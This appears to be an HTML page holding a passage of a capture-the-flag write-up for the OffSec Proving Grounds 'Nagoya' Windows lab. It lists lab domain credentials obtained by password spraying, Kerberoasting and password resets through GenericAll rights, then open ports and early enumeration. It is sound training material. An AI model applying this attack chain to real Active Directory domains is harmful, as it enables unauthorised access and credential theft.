@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en"><head><title>Nagoya - Cameron Candau</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source Sans 3:wght@400;700&amp;family=Source Sans 3:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="/CTF"/><meta property="og:title" content="Nagoya - Cameron Candau"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Nagoya - Cameron Candau"/><meta name="twitter:description" content="Difficulty: Hard Domain Credentials melissa.mitchell:Spring2023 No apparent access fiona.clark:Summer2023 Discovered from password spraying with season-wordlist.txt SMB and LDAP access svc_mssql:Service1 Found by Kerberoasting svc_helpdesk:Password123 Set using fiona.clark GenericAll permissions chr..."/><meta property="og:description" content="Difficulty: Hard Domain Credentials melissa.mitchell:Spring2023 No apparent access fiona.clark:Summer2023 Discovered from password spraying with season-wordlist.txt SMB and LDAP access svc_mssql:Service1 Found by Kerberoasting svc_helpdesk:Password123 Set using fiona.clark GenericAll permissions chr..."/><meta property="og:image:alt" content="Difficulty: Hard Domain Credentials melissa.mitchell:Spring2023 No apparent access fiona.clark:Summer2023 Discovered from password spraying with season-wordlist.txt SMB and LDAP access svc_mssql:Service1 Found by Kerberoasting svc_helpdesk:Password123 Set using fiona.clark GenericAll permissions chr..."/><meta property="og:image" content="https://cameroncandau.com/ctf/static/og-image.png"/><meta property="og:image:url" content="https://cameroncandau.com/ctf/static/og-image.png"/><meta name="twitter:image" content="https://cameroncandau.com/ctf/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="cameroncandau.com/ctf"/><meta property="og:url" content="https://cameroncandau.com/ctf/Archive/OFFSEC---Proving-Grounds-Writeups/Windows/Nagoya"/><meta property="twitter:url" content="https://cameroncandau.com/ctf/Archive/OFFSEC---Proving-Grounds-Writeups/Windows/Nagoya"/><link rel="icon" type="image/svg+xml" href="/favicon.svg"/><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/><link rel="manifest" href="/site.webmanifest"/><meta name="description" content="Difficulty: Hard Domain Credentials melissa.mitchell:Spring2023 No apparent access fiona.clark:Summer2023 Discovered from password spraying with season-wordlist.txt SMB and LDAP access svc_mssql:Service1 Found by Kerberoasting svc_helpdesk:Password123 Set using fiona.clark GenericAll permissions chr..."/><meta name="generator" content="Quartz"/><link href="../../../index.css" rel="stylesheet" type="text/css" spa-preserve/><style>.expand-button {
+  position: absolute;
+  display: flex;
+  float: right;
+  padding: 0.4rem;
+  margin: 0.3rem;
+  right: 0;
+  color: var(--gray);
+  border-color: var(--dark);
+  background-color: var(--light);
+  border: 1px solid;
+  border-radius: 5px;
+  opacity: 0;
+  transition: 0.2s;
+}
+.expand-button > svg {
+  fill: var(--light);
+  filter: contrast(0.3);
+}
+.expand-button:hover {
+  cursor: pointer;
+  border-color: var(--secondary);
+}
+.expand-button:focus {
+  outline: 0;
+}
+
+pre:hover > .expand-button {
+  opacity: 1;
+  transition: 0.2s;
+}
+
+#mermaid-container {
+  position: fixed;
+  contain: layout;
+  z-index: 999;
+  left: 0;
+  top: 0;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+  display: none;
+  backdrop-filter: blur(4px);
+  background: rgba(0, 0, 0, 0.5);
+}
+#mermaid-container.active {
+  display: inline-block;
+}
+#mermaid-container > #mermaid-space {
+  border: 1px solid var(--lightgray);
+  background-color: var(--light);
+  border-radius: 5px;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  height: 80vh;
+  width: 80vw;
+  overflow: hidden;
+}
+#mermaid-container > #mermaid-space > .mermaid-content {
+  padding: 2rem;
+  position: relative;
+  transform-origin: 0 0;
+  transition: transform 0.1s ease;
+  overflow: visible;
+  min-height: 200px;
+  min-width: 200px;
+}
+#mermaid-container > #mermaid-space > .mermaid-content pre {
+  margin: 0;
+  border: none;
+}
+#mermaid-container > #mermaid-space > .mermaid-content svg {
+  max-width: none;
+  height: auto;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls {
+  position: absolute;
+  bottom: 20px;
+  right: 20px;
+  display: flex;
+  gap: 8px;
+  padding: 8px;
+  background: var(--light);
+  border: 1px solid var(--lightgray);
+  border-radius: 6px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  z-index: 2;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  padding: 0;
+  border: 1px solid var(--lightgray);
+  background: var(--light);
+  color: var(--dark);
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  font-family: var(--bodyFont);
+  transition: all 0.2s ease;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:hover {
+  background: var(--lightgray);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:active {
+  transform: translateY(1px);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:nth-child(2) {
+  width: auto;
+  padding: 0 12px;
+  font-size: 14px;
+}
+/*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiL2hvbWUvcnVubmVyL3dvcmsvcGVyc29uYWwtd2Vic2l0ZS9wZXJzb25hbC13ZWJzaXRlL2N0Zi1xdWFydHovcXVhcnR6L2NvbXBvbmVudHMvc3R5bGVzIiwic291cmNlcyI6WyJtZXJtYWlkLmlubGluZS5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBOztBQUdGO0VBQ0U7RUFDQTs7QUFHRjtFQUNFOzs7QUFLRjtFQUNFO0VBQ0E7OztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFOztBQUdGO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7O0FBR0Y7RUFDRTtFQUNBOztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTs7QUFHRjtFQUNFOztBQUlGO0VBQ0U7RUFDQTtFQUNBIiwic291cmNlc0NvbnRlbnQiOlsiLmV4cGFuZC1idXR0b24ge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIGZsb2F0OiByaWdodDtcbiAgcGFkZGluZzogMC40cmVtO1xuICBtYXJnaW46IDAuM3JlbTtcbiAgcmlnaHQ6IDA7IC8vIE5PVEU6IHJpZ2h0IHdpbGwgYmUgc2V0IGluIG1lcm1haWQuaW5saW5lLnRzXG4gIGNvbG9yOiB2YXIoLS1ncmF5KTtcbiAgYm9yZGVyLWNvbG9yOiB2YXIoLS1kYXJrKTtcbiAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tbGlnaHQpO1xuICBib3JkZXI6IDFweCBzb2xpZDtcbiAgYm9yZGVyLXJhZGl1czogNXB4O1xuICBvcGFjaXR5OiAwO1xuICB0cmFuc2l0aW9uOiAwLjJzO1xuXG4gICYgPiBzdmcge1xuICAgIGZpbGw6IHZhcigtLWxpZ2h0KTtcbiAgICBmaWx0ZXI6IGNvbnRyYXN0KDAuMyk7XG4gIH1cblxuICAmOmhvdmVyIHtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgYm9yZGVyLWNvbG9yOiB2YXIoLS1zZWNvbmRhcnkpO1xuICB9XG5cbiAgJjpmb2N1cyB7XG4gICAgb3V0bGluZTogMDtcbiAgfVxufVxuXG5wcmUge1xuICAmOmhvdmVyID4gLmV4cGFuZC1idXR0b24ge1xuICAgIG9wYWNpdHk6IDE7XG4gICAgdHJhbnNpdGlvbjogMC4ycztcbiAgfVxufVxuXG4jbWVybWFpZC1jb250YWluZXIge1xuICBwb3NpdGlvbjogZml4ZWQ7XG4gIGNvbnRhaW46IGxheW91dDtcbiAgei1pbmRleDogOTk5O1xuICBsZWZ0OiAwO1xuICB0b3A6IDA7XG4gIHdpZHRoOiAxMDB2dztcbiAgaGVpZ2h0OiAxMDB2aDtcbiAgb3ZlcmZsb3c6IGhpZGRlbjtcbiAgZGlzcGxheTogbm9uZTtcbiAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCk7XG4gIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC41KTtcblxuICAmLmFjdGl2ZSB7XG4gICAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xuICB9XG5cbiAgJiA+ICNtZXJtYWlkLXNwYWNlIHtcbiAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLWxpZ2h0KTtcbiAgICBib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgcG9zaXRpb246IGZpeGVkO1xuICAgIHRvcDogNTAlO1xuICAgIGxlZnQ6IDUwJTtcbiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTtcbiAgICBoZWlnaHQ6IDgwdmg7XG4gICAgd2lkdGg6IDgwdnc7XG4gICAgb3ZlcmZsb3c6IGhpZGRlbjtcblxuICAgICYgPiAubWVybWFpZC1jb250ZW50IHtcbiAgICAgIHBhZGRpbmc6IDJyZW07XG4gICAgICBwb3NpdGlvbjogcmVsYXRpdmU7XG4gICAgICB0cmFuc2Zvcm0tb3JpZ2luOiAwIDA7XG4gICAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4xcyBlYXNlO1xuICAgICAgb3ZlcmZsb3c6IHZpc2libGU7XG4gICAgICBtaW4taGVpZ2h0OiAyMDBweDtcbiAgICAgIG1pbi13aWR0aDogMjAwcHg7XG5cbiAgICAgIHByZSB7XG4gICAgICAgIG1hcmdpbjogMDtcbiAgICAgICAgYm9yZGVyOiBub25lO1xuICAgICAgfVxuXG4gICAgICBzdmcge1xuICAgICAgICBtYXgtd2lkdGg6IG5vbmU7XG4gICAgICAgIGhlaWdodDogYXV0bztcbiAgICAgIH1cbiAgICB9XG5cbiAgICAmID4gLm1lcm1haWQtY29udHJvbHMge1xuICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgYm90dG9tOiAyMHB4O1xuICAgICAgcmlnaHQ6IDIwcHg7XG4gICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgZ2FwOiA4cHg7XG4gICAgICBwYWRkaW5nOiA4cHg7XG4gICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodCk7XG4gICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgYm9yZGVyLXJhZGl1czogNnB4O1xuICAgICAgYm94LXNoYWRvdzogMCAycHggNHB4IHJnYmEoMCwgMCwgMCwgMC4xKTtcbiAgICAgIHotaW5kZXg6IDI7XG5cbiAgICAgIC5tZXJtYWlkLWNvbnRyb2wtYnV0dG9uIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgICAgIHdpZHRoOiAzMnB4O1xuICAgICAgICBoZWlnaHQ6IDMycHg7XG4gICAgICAgIHBhZGRpbmc6IDA7XG4gICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0KTtcbiAgICAgICAgY29sb3I6IHZhcigtLWRhcmspO1xuICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7XG4gICAgICAgIGN1cnNvcjogcG9pbnRlcjtcbiAgICAgICAgZm9udC1zaXplOiAxNnB4O1xuICAgICAgICBmb250LWZhbWlseTogdmFyKC0tYm9keUZvbnQpO1xuICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlO1xuXG4gICAgICAgICY6aG92ZXIge1xuICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIH1cblxuICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDFweCk7XG4gICAgICAgIH1cblxuICAgICAgICAvLyBTdHlsZSB0aGUgcmVzZXQgYnV0dG9uIGRpZmZlcmVudGx5XG4gICAgICAgICY6bnRoLWNoaWxkKDIpIHtcbiAgICAgICAgICB3aWR0aDogYXV0bztcbiAgICAgICAgICBwYWRkaW5nOiAwIDEycHg7XG4gICAgICAgICAgZm9udC1zaXplOiAxNHB4O1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfVxuICB9XG59XG4iXX0= */</style><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../../../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../../../static/contentIndex.json").then(data => data.json())</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://cameroncandau.com/ctf/index.xml"/></head><body data-slug="Archive/OFFSEC---Proving-Grounds-Writeups/Windows/Nagoya"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><div class="page-title"><a class="page-title__parent" href="/" data-router-ignore="true">Back to CameronCandau.com</a><h2 class="page-title__home"><a href="../../..">/CTF</a></h2></div><div class="spacer mobile-only"></div><div style="display: flex; flex-direction: row; flex-wrap: nowrap; gap: 1rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div class="search-layout" data-preview="true"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div></div><div class="explorer" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a,b)=>!a.isFolder&amp;&amp;!b.isFolder||a.isFolder&amp;&amp;b.isFolder?a.displayName.localeCompare(b.displayName,void 0,{numeric:!0,sensitivity:\&quot;base\&quot;}):!a.isFolder&amp;&amp;b.isFolder?1:-1&quot;,&quot;filterFn&quot;:&quot;node=>node.slugSegment!==\&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;node=>node&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-content"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div class="explorer-content" aria-expanded="false"><ul class="explorer-ul overflow" id="ktgm2w"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#"></a></li></template><template id="template-folder"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../../../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../Archive/">Archive</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../Archive/OFFSEC---Proving-Grounds-Writeups/">OFFSEC   Proving Grounds Writeups</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../Archive/OFFSEC---Proving-Grounds-Writeups/Windows/">Windows</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Nagoya</a></div></nav><h1 class="article-title">Nagoya</h1><p show-comma="true" class="content-meta"><time datetime="2026-06-23T06:24:23.636Z">Jun 23, 2026</time><span>8 min read</span></p></div></div><article class="popover-hint"><p>Difficulty: Hard</p>
+<h1 id="domain-credentials">Domain Credentials<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#domain-credentials" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p>melissa.mitchell:Spring2023</p>
+<ul>
+<li>No apparent access
+fiona.clark:Summer2023</li>
+<li>Discovered from password spraying with season-wordlist.txt</li>
+<li>SMB and LDAP access
+svc_mssql:Service1</li>
+<li>Found by Kerberoasting</li>
+</ul>
+<p>svc_helpdesk:Password123</p>
+<ul>
+<li>Set using fiona.clark GenericAll permissions
+christopher.lewis:Password123</li>
+<li>Set using svc_helpdesk GenericAll permissions</li>
+</ul>
+<hr/>
+<h1 id="service-discovery">Service Discovery<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#service-discovery" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<h2 id="open-ports--priority">Open Ports &amp; Priority<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#open-ports--priority" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>TCP Ports:</p>
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled/> 53</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 80</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 88</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 135</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 139</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 389</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 445</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 464</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 593</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 636</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 3268</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 3269</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 3389</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 5985</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 9389</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49666</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49667</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49675</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49676</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49678</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49691</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49698</li>
+<li class="task-list-item"><input type="checkbox" disabled/> 49717</li>
+</ul>
+<h1 id="service-enumeration">Service Enumeration<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#service-enumeration" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<h2 id="3389">3389<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3389" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Note FQDN from RDP scans:</p>
+<p><img src="../../../attachments/Pasted-image-20251122085827.png" width="auto" height="auto" alt/></p>
+<p>nagoya.nagoya-industries.com</p>
+<p>Add to /etc/hosts</p>
+<h2 id="53">53<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#53" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Unable to AXFR:</p>
+<p><img src="../../../attachments/Pasted-image-20251122092516.png" width="auto" height="auto" alt/></p>
+<p>dnsrecon doesn’t reveal any new information:</p>
+<p><img src="../../../attachments/Pasted-image-20251122092526.png" width="auto" height="auto" alt/></p>
+<h2 id="80">80<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#80" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>HTTP, website for Nagoya Industries fishing business</p>
+<p>Server: Microsoft-IIS/10.0</p>
+<p><img src="../../../attachments/Pasted-image-20251122090015.png" width="auto" height="auto" alt/></p>
+<p>/Team contains a straightforward list of First Name - Last Name pairs for employees.
+<a href="http://nagoya.nagoya-industries.com/Team" class="external">http://nagoya.nagoya-industries.com/Team<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
+<p><img src="../../../attachments/Pasted-image-20251122090117.png" width="auto" height="auto" alt/></p>
+<p>We may be able to use this to guess domain usernames later if needed.</p>
+<p>/error shows an interesting message. Showing an unpolished error and request ID leads me to believe that the server is already in development mode, but the instructions also make it sound like it isn’t enabled yet.</p>
+<p><img src="../../../attachments/Pasted-image-20251122090423.png" width="auto" height="auto" alt/></p>
+<p>Researching online, it seems that with <code>ASPNETCORE_ENVIRONMENT = Development</code> apps display detailed error pages which can include stack traces and server paths. The request ID is probably an indicator that Development mode is indeed on, but I don’t think there’s anything we can actually use the request ID for… moving on for now.</p>
+<h2 id="139--445">139 / 445<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#139--445" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Autorecon scans show no anonymous access to SMB.
+I’ll verify manually with netexec:</p>
+<p><img src="../../../attachments/Pasted-image-20251122091010.png" width="auto" height="auto" alt/></p>
